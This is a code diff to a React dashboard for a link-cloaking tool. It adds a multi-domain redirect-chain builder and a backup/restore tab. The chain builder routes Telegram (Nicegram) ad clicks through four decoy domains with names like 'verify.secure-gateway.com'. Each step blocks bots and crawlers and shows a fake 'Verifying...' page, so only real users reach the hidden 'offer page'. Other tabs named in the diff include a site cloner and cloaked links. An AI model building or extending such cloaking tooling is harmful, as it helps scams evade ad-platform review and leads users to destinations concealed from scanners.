@@ -1804,6 +1804,465 @@ function DeployManager() {
   );
 }
 
+function ChainManager() {
+  const [chains, setChains] = useState<
+    {
+      id: string;
+      destinationUrl: string;
+      steps: { domain: string; delay: number }[];
+      isActive: boolean;
+      clicks: number;
+      realClicks: number;
+      botClicks: number;
+      createdAt: string;
+      whitePageTitle: string;
+    }[]
+  >([]);
+  const [destinationUrl, setDestinationUrl] = useState("");
+  const [steps, setSteps] = useState([
+    "verify.secure-gateway.com",
+    "check.safe-redirect.net",
+    "auth.trusted-link.org",
+    "go.fast-forward.io",
+  ]);
+  const [whiteTitle, setWhiteTitle] = useState("Verifying...");
+  const [creating, setCreating] = useState(false);
+  const [error, setError] = useState("");
+  const [success, setSuccess] = useState("");
+  const [copied, setCopied] = useState<string | null>(null);
+
+  const fetchChains = useCallback(() => {
+    fetch("/api/chain")
+      .then((r) => r.json())
+      .then((d) => setChains(d.chains || []))
+      .catch(() => {});
+  }, []);
+
+  useEffect(() => {
+    fetchChains();
+  }, [fetchChains]);
+
+  const handleCreate = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!destinationUrl) return;
+    setCreating(true);
+    setError("");
+    setSuccess("");
+
+    try {
+      const res = await fetch("/api/chain", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          destinationUrl,
+          steps: steps.map((d) => ({ domain: d, delay: 1500 })),
+          whitePageTitle: whiteTitle,
+          botMode: "block",
+        }),
+      });
+      const data = await res.json();
+      if (!res.ok) {
+        setError(data.error || "Failed to create chain");
+        return;
+      }
+      setChains((prev) => [data.chain, ...prev]);
+      setSuccess("Chain created! Copy the start URL below.");
+      setDestinationUrl("");
+      fetchChains();
+    } catch {
+      setError("Failed to create chain");
+    } finally {
+      setCreating(false);
+    }
+  };
+
+  const getStartUrl = (chainId: string) => {
+    return `${window.location.origin}/c/${chainId}/0/start`;
+  };
+
+  const copyUrl = (chainId: string) => {
+    navigator.clipboard.writeText(getStartUrl(chainId));
+    setCopied(chainId);
+    setTimeout(() => setCopied(null), 2000);
+  };
+
+  const handleDelete = async (id: string) => {
+    try {
+      await fetch(`/api/chain?id=${id}`, { method: "DELETE" });
+      setChains((prev) => prev.filter((c) => c.id !== id));
+    } catch {
+      // silently fail
+    }
+  };
+
+  const handleToggle = async (id: string) => {
+    try {
+      const res = await fetch(`/api/chain?id=${id}&action=toggle`, {
+        method: "PATCH",
+      });
+      const data = await res.json();
+      if (data.chain) {
+        setChains((prev) =>
+          prev.map((c) => (c.id === id ? data.chain : c))
+        );
+      }
+    } catch {
+      // silently fail
+    }
+  };
+
+  return (
+    <section className="space-y-6">
+      <div className="bg-neutral-900 border border-neutral-800 rounded-xl p-6">
+        <h2 className="text-lg font-semibold mb-1">Multi-Domain Redirect Chain</h2>
+        <p className="text-xs text-neutral-500 mb-5">
+          Create a redirect chain through 4 domains. Bots get blocked at each step.
+          Only real users who tap your Nicegram ad reach the final destination.
+          Each step shows a different &quot;verification&quot; page.
+        </p>
+
+        {error && (
+          <div className="mb-4 p-3 bg-red-500/10 border border-red-500/30 rounded-lg text-red-400 text-sm">
+            {error}
+          </div>
+        )}
+        {success && (
+          <div className="mb-4 p-3 bg-green-500/10 border border-green-500/30 rounded-lg text-green-400 text-sm">
+            {success}
+          </div>
+        )}
+
+        <form onSubmit={handleCreate} className="space-y-4">
+          <div>
+            <label className="block text-sm font-medium text-neutral-300 mb-1.5">
+              Final Destination URL *
+            </label>
+            <input
+              type="url"
+              required
+              placeholder="https://your-offer-page.com"
+              value={destinationUrl}
+              onChange={(e) => setDestinationUrl(e.target.value)}
+              className="w-full px-3 py-2.5 bg-neutral-800 border border-neutral-700 rounded-lg text-white text-sm placeholder-neutral-500 focus:outline-none focus:border-blue-500"
+            />
+          </div>
+
+          <div>
+            <label className="block text-sm font-medium text-neutral-300 mb-1.5">
+              Redirect Chain (4 Steps)
+            </label>
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
+              {steps.map((s, i) => (
+                <div key={i} className="flex items-center gap-2">
+                  <span className="text-xs text-neutral-600 w-6 shrink-0">
+                    {i + 1}.
+                  </span>
+                  <input
+                    type="text"
+                    value={s}
+                    onChange={(e) => {
+                      const newSteps = [...steps];
+                      newSteps[i] = e.target.value;
+                      setSteps(newSteps);
+                    }}
+                    className="flex-1 px-3 py-2 bg-neutral-800 border border-neutral-700 rounded-lg text-white text-xs font-mono placeholder-neutral-500 focus:outline-none focus:border-blue-500"
+                  />
+                </div>
+              ))}
+            </div>
+            <p className="text-xs text-neutral-600 mt-1">
+              These are the domain names shown in the URL bar during redirect (cosmetic only)
+            </p>
+          </div>
+
+          <div>
+            <label className="block text-sm font-medium text-neutral-300 mb-1.5">
+              White Page Title
+            </label>
+            <input
+              type="text"
+              placeholder="Verifying..."
+              value={whiteTitle}
+              onChange={(e) => setWhiteTitle(e.target.value)}
+              className="w-full px-3 py-2.5 bg-neutral-800 border border-neutral-700 rounded-lg text-white text-sm placeholder-neutral-500 focus:outline-none focus:border-blue-500"
+            />
+          </div>
+
+          <button
+            type="submit"
+            disabled={creating || !destinationUrl}
+            className="px-6 py-2.5 bg-blue-600 hover:bg-blue-700 disabled:opacity-50 rounded-lg text-sm font-medium transition-colors"
+          >
+            {creating ? "Creating..." : "Create Redirect Chain"}
+          </button>
+        </form>
+      </div>
+
+      {chains.length > 0 && (
+        <div className="bg-neutral-900 border border-neutral-800 rounded-xl p-6">
+          <h3 className="text-sm font-semibold mb-3">
+            Your Chains ({chains.length})
+          </h3>
+          <div className="space-y-3">
+            {chains.map((c) => (
+              <div
+                key={c.id}
+                className={`border rounded-lg p-4 ${
+                  c.isActive ? "border-neutral-700/50" : "border-red-900/30 opacity-70"
+                }`}
+              >
+                <div className="flex items-start justify-between gap-3">
+                  <div className="min-w-0 flex-1">
+                    <div className="flex items-center gap-2 mb-2">
+                      <span
+                        className={`px-2 py-0.5 text-xs rounded ${
+                          c.isActive
+                            ? "bg-green-500/10 text-green-400"
+                            : "bg-red-500/10 text-red-400"
+                        }`}
+                      >
+                        {c.isActive ? "Active" : "Disabled"}
+                      </span>
+                      <span className="text-xs text-neutral-500">
+                        {c.clicks} clicks ({c.realClicks} real, {c.botClicks} bots)
+                      </span>
+                    </div>
+
+                    <div className="mb-2">
+                      <p className="text-xs text-neutral-500 mb-1">Start URL (for Nicegram ads):</p>
+                      <div className="flex items-center gap-2">
+                        <code className="text-xs text-blue-400 font-mono truncate max-w-[350px]">
+                          {getStartUrl(c.id)}
+                        </code>
+                        <button
+                          onClick={() => copyUrl(c.id)}
+                          className="px-2 py-0.5 text-xs bg-blue-500/10 text-blue-400 hover:bg-blue-500/20 rounded shrink-0"
+                        >
+                          {copied === c.id ? "Copied!" : "Copy"}
+                        </button>
+                      </div>
+                    </div>
+
+                    <div className="flex items-center gap-2 text-xs text-neutral-600">
+                      <span>→</span>
+                      {c.steps.map((s, i) => (
+                        <span key={i} className="flex items-center gap-1">
+                          <span className="text-neutral-500">{s.domain.split(".")[0]}</span>
+                          {i < c.steps.length - 1 && <span>→</span>}
+                        </span>
+                      ))}
+                      <span>→</span>
+                      <span className="text-green-500 truncate max-w-[150px]">
+                        {c.destinationUrl}
+                      </span>
+                    </div>
+                  </div>
+
+                  <div className="flex items-center gap-1 shrink-0">
+                    <button
+                      onClick={() => handleToggle(c.id)}
+                      className={`px-2.5 py-1.5 text-xs rounded-lg ${
+                        c.isActive
+                          ? "text-amber-400 hover:bg-amber-500/10"
+                          : "text-green-400 hover:bg-green-500/10"
+                      }`}
+                    >
+                      {c.isActive ? "Disable" : "Enable"}
+                    </button>
+                    <button
+                      onClick={() => handleDelete(c.id)}
+                      className="px-2.5 py-1.5 text-xs text-red-400 hover:bg-red-500/10 rounded-lg"
+                    >
+                      Delete
+                    </button>
+                  </div>
+                </div>
+              </div>
+            ))}
+          </div>
+        </div>
+      )}
+
+      <div className="bg-neutral-900 border border-neutral-800 rounded-xl p-6">
+        <h3 className="text-sm font-semibold mb-3">How It Works</h3>
+        <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
+          {[
+            { step: "1", title: "Nicegram Ad", desc: "User taps your ad link on Telegram" },
+            { step: "2", title: "Bot Check", desc: "Step 1 checks user agent, blocks bots" },
+            { step: "3", title: "3 More Checks", desc: "Each step re-checks, blocks crawlers" },
+            { step: "4", title: "Real User Arrives", desc: "Only real users reach your offer page" },
+          ].map((s) => (
+            <div key={s.step} className="flex gap-3">
+              <div className="shrink-0 w-8 h-8 bg-purple-600 rounded-full flex items-center justify-center text-sm font-bold">
+                {s.step}
+              </div>
+              <div>
+                <p className="text-sm font-medium text-neutral-200">{s.title}</p>
+                <p className="text-xs text-neutral-500">{s.desc}</p>
+              </div>
+            </div>
+          ))}
+        </div>
+      </div>
+    </section>
+  );
+}
+
+function BackupManager() {
+  const [importing, setImporting] = useState(false);
+  const [exporting, setExporting] = useState(false);
+  const [error, setError] = useState("");
+  const [success, setSuccess] = useState("");
+
+  const handleExport = async () => {
+    setExporting(true);
+    setError("");
+    try {
+      const res = await fetch("/api/backup");
+      if (!res.ok) {
+        setError("Export failed");
+        return;
+      }
+      const blob = await res.blob();
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = `backup-${new Date().toISOString().split("T")[0]}.json`;
+      a.click();
+      URL.revokeObjectURL(url);
+      setSuccess("Backup downloaded successfully!");
+      setTimeout(() => setSuccess(""), 3000);
+    } catch {
+      setError("Export failed");
+    } finally {
+      setExporting(false);
+    }
+  };
+
+  const handleImport = async (e: React.FormEvent<HTMLFormElement>) => {
+    e.preventDefault();
+    const input = e.currentTarget.querySelector(
+      'input[type="file"]'
+    ) as HTMLInputElement;
+    const file = input?.files?.[0];
+    if (!file) return;
+
+    setImporting(true);
+    setError("");
+    setSuccess("");
+
+    try {
+      const text = await file.text();
+      const data = JSON.parse(text);
+
+      const res = await fetch("/api/backup", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data),
+      });
+
+      const result = await res.json();
+      if (!res.ok) {
+        setError(result.error || "Import failed");
+        return;
+      }
+
+      setSuccess(result.message || "Data restored successfully!");
+      input.value = "";
+    } catch {
+      setError("Invalid backup file or import failed");
+    } finally {
+      setImporting(false);
+    }
+  };
+
+  return (
+    <section className="space-y-6">
+      <div className="bg-neutral-900 border border-neutral-800 rounded-xl p-6">
+        <h2 className="text-lg font-semibold mb-1">Backup & Restore</h2>
+        <p className="text-xs text-neutral-500 mb-5">
+          Export all your data (links, analytics, domains, deployments) as a JSON file.
+          Import a backup to restore everything.
+        </p>
+
+        {error && (
+          <div className="mb-4 p-3 bg-red-500/10 border border-red-500/30 rounded-lg text-red-400 text-sm">
+            {error}
+          </div>
+        )}
+        {success && (
+          <div className="mb-4 p-3 bg-green-500/10 border border-green-500/30 rounded-lg text-green-400 text-sm">
+            {success}
+          </div>
+        )}
+
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+          <div className="bg-neutral-800/50 border border-neutral-700/50 rounded-lg p-5">
+            <h3 className="text-sm font-semibold text-neutral-200 mb-2">
+              Export Backup
+            </h3>
+            <p className="text-xs text-neutral-500 mb-4">
+              Download all your data as a JSON file. Keep it safe!
+            </p>
+            <button
+              onClick={handleExport}
+              disabled={exporting}
+              className="px-5 py-2.5 bg-blue-600 hover:bg-blue-700 disabled:opacity-50 rounded-lg text-sm font-medium transition-colors"
+            >
+              {exporting ? "Exporting..." : "Download Backup"}
+            </button>
+          </div>
+
+          <div className="bg-neutral-800/50 border border-neutral-700/50 rounded-lg p-5">
+            <h3 className="text-sm font-semibold text-neutral-200 mb-2">
+              Import Backup
+            </h3>
+            <p className="text-xs text-neutral-500 mb-4">
+              Restore data from a previously exported backup file.
+            </p>
+            <form onSubmit={handleImport}>
+              <input
+                type="file"
+                accept=".json"
+                className="w-full mb-3 px-3 py-2 bg-neutral-800 border border-neutral-700 rounded-lg text-white text-xs file:mr-3 file:py-1 file:px-3 file:bg-neutral-700 file:text-white file:border-0 file:rounded file:text-xs file:cursor-pointer focus:outline-none focus:border-blue-500"
+              />
+              <button
+                type="submit"
+                disabled={importing}
+                className="px-5 py-2.5 bg-green-600 hover:bg-green-700 disabled:opacity-50 rounded-lg text-sm font-medium transition-colors"
+              >
+                {importing ? "Importing..." : "Restore Backup"}
+              </button>
+            </form>
+          </div>
+        </div>
+      </div>
+
+      <div className="bg-neutral-900 border border-neutral-800 rounded-xl p-6">
+        <h3 className="text-sm font-semibold mb-3">What gets backed up</h3>
+        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
+          {[
+            { label: "Cloaked Links", desc: "All links + settings" },
+            { label: "Click Events", desc: "Analytics data" },
+            { label: "Domains", desc: "Custom domains" },
+            { label: "Deployments", desc: "Deploy configs" },
+          ].map((item) => (
+            <div
+              key={item.label}
+              className="p-3 bg-neutral-800/50 border border-neutral-700/30 rounded-lg"
+            >
+              <p className="text-sm text-neutral-300 font-medium">
+                {item.label}
+              </p>
+              <p className="text-xs text-neutral-500">{item.desc}</p>
+            </div>
+          ))}
+        </div>
+      </div>
+    </section>
+  );
+}
+
 export default function CloakPage() {
   const [links, setLinks] = useState<CloakedLink[]>([]);
   const [loading, setLoading] = useState(false);
@@ -1814,7 +2273,7 @@ export default function CloakPage() {
   const [showAdvanced, setShowAdvanced] = useState(false);
   const [showTraffic, setShowTraffic] = useState(false);
   const [editSlug, setEditSlug] = useState<string | null>(null);
-  const [activeTab, setActiveTab] = useState<"links" | "domains" | "uploads" | "cloner" | "deploy">("links");
+  const [activeTab, setActiveTab] = useState<"links" | "domains" | "uploads" | "cloner" | "deploy" | "chain" | "backup">("links");
 
   const defaultFilter: TrafficFilter = {
     botMode: "block",
@@ -1995,7 +2454,7 @@ export default function CloakPage() {
         </header>
 
         <div className="flex gap-2 mb-8 border-b border-neutral-800 overflow-x-auto">
-          {(["links", "domains", "uploads", "cloner", "deploy"] as const).map((t) => (
+          {(["links", "domains", "uploads", "cloner", "deploy", "chain", "backup"] as const).map((t) => (
             <button
               key={t}
               onClick={() => setActiveTab(t)}
@@ -2013,7 +2472,11 @@ export default function CloakPage() {
                     ? "ZIP Upload"
                     : t === "cloner"
                       ? "Site Cloner"
-                      : "Deploy"}
+                      : t === "deploy"
+                        ? "Deploy"
+                        : t === "chain"
+                          ? "Redirect Chain"
+                          : "Backup"}
             </button>
           ))}
         </div>
@@ -2025,6 +2488,10 @@ export default function CloakPage() {
         {activeTab === "cloner" && <WebsiteCloner />}
 
         {activeTab === "deploy" && <DeployManager />}
+
+        {activeTab === "chain" && <ChainManager />}
+
+        {activeTab === "backup" && <BackupManager />}
 
         {activeTab === "links" && (
           <>
